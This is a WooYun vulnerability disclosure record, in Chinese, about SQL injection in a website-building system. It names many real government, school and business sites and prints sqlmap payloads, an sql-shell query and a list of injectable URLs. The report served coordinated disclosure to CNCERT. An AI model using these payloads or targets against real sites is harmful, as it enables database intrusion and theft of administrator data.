{"id": 51576, "wybug_id": "wooyun-2014-074044", "wybug_title": "某建站系统存在SQL注入，影响多个政府、企业等网站", "wybug_corp": "科域网络", "wybug_author": "路人甲", "wybug_date": "2014-08-27 18:05", "wybug_open_date": "2014-11-25 18:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向公众公开  简要描述： SQL注入 详细说明：  江门科域网络主站http://www.iebcc.com/\n\n看其客户\n\n政府事业单位类：\n\n大概27个由于为Access数据库这里就不爆表仅查询admin表数据数量   漏洞证明：  政府事业单位：江门市新会区住房和城乡建设局在搜索处存在注入http://www.xhjsj.gov.cn/\n\n在搜索处输入'\n\n\n\n构造注入urlhttp://www.xhjsj.gov.cn/search.asp?keyword=1&BtnFind.x=35&BtnFind.y=14 \nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: keyword    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keyword=1%' AND 3552=3552 AND '%'='&BtnFind.x=35&BtnFind.y=14---[11:47:37] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access\n\n[5 tables]+---------+| admin   || article || images  || info    || video   |+---------+\nadmin中有两条数据\n\n在url输入admin跳转到管理员登陆界面\n\n-------江顺大桥-江门大道http://www.jmjsdq.com注入点：http://www.jmjsdq.com/search.asp?keyword=1&imageField.x=0&imageField.y=0\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: keyword    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keyword=1%' AND 1732=1732 AND '%'='&imageField.x=0&imageField.y=0    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: keyword=1%' AND 9055=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(119)+CHAR(113)+(SELECT (CASE WHEN (9055=9055) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(110)+CHAR(113)+CHAR(111)+CHAR(113))) AND '%'='&imageField.x=0&imageField.y=0    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: keyword=1%'; WAITFOR DELAY '0:0:5'--&imageField.x=0&imageField.y=0    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: keyword=1%' WAITFOR DELAY '0:0:5'--&imageField.x=0&imageField.y=0---\n\nweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[12:58:49] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTERsql-shell> select count(*) from admin;[12:58:59] [INFO] fetching SQL SELECT statement query output: 'select count(*) from admin'[12:58:59] [INFO] retrieved: 2select count(*) from admin;:    '2'\n-------江门市物业管理协会http://www.jmwyxh.org.cn注入点http://www.jmwyxh.org.cn/show_news.asp?guid=20140805113948583\n\n\nGET parameter 'guid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 35 HTTP(s) requests:---Place: GETParameter: guid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: guid=20140805113948583' AND 1390=1390 AND 'Nibh'='Nibh---\n\n\n-----五邑大学  纺织服装学院http://dept.wyu.edu.cn/fangzhi/search.asp?fieldname=title&keyword=0&imageField.x=0&imageField.y=0\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: keyword    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: fieldname=title&keyword=0%' AND 8654=8654 AND '%'='&imageField.x=0&imageField.y=0---\n\n\n------江门红十字会医院【入侵痕迹】\n\n-----江门交通运输工程质量检测站注入点http://www.jmjtzjz.com/search.asp?fieldname=title&keyword=0&imageField.x=0&imageField.y=0\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.jmjtzjz.com:80/search.asp?fieldname=title&keyword=0%' AND 2971=2971 AND '%'='&imageField.x=0&imageField.y=0---\n\n\n-------杜阮中心初中注入点：http://www.drzxcz.com/search.asp?condition=content&keyword=0&x=0&y=0\n\n\n\n---广东省地质局第六地质大队http://www.gddz6d.com/search.asp?keyword=1&imageField.x=0&imageField.y=0\n\n\n\n南海殡仪馆http://www.nhbyg.com/news.asp?url=news.asp&keyword=0%27&BtnOk=%CB%D1%CB%F7江门市新会区城市综合管理局http://cgj.xinhui.gov.cn/search.asp?fenlei=1&keywords=0%27&submit.x=13&submit.y=16江门航道局http://www.jmhdw.com/zwgk.asp?linkurl=zwgk.asp&keyword=0%27&imageField.x=0&imageField.y=0=====================有很多，这里举几个例子门户类\n江门赛格车圣http://www.jm952100.com/shop.asp?keyword=0%27&imageField.x=0&imageField.y=0中国台山玉雕-台山玉石http://www.zgtsyd.com/products.asp?keyword=d%27&BtnOk.x=18&BtnOk.y=12一个手机商城http://www.mfxshop.cn/mobile.asp?keyword=a%27&imageField.x=0&imageField.y=0\n企业类\nhttp://www.jmgongcheng.com/search.asp?keyword=a%27&imageField.x=14&imageField.y=13http://www.ymyg360.com/products.asp?keyword=a&BtnSearch=%B2%FA%C6%B7%CB%D1%CB%F7http://www.opasm.com.cn/products.asp?keyword=a&imageField.x=4&imageField.y=11\nhttp://www.jmjtzjz.com/search.asp?fieldname=title&keyword=0&imageField.x=0&imageField.y=0   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-09-01 09:59 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过电话和邮件向软件生产厂商通报，同时，根据测试案例，已经转由CNCERT下发给广东分中心并通报教育网应急组织处置相关案例。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}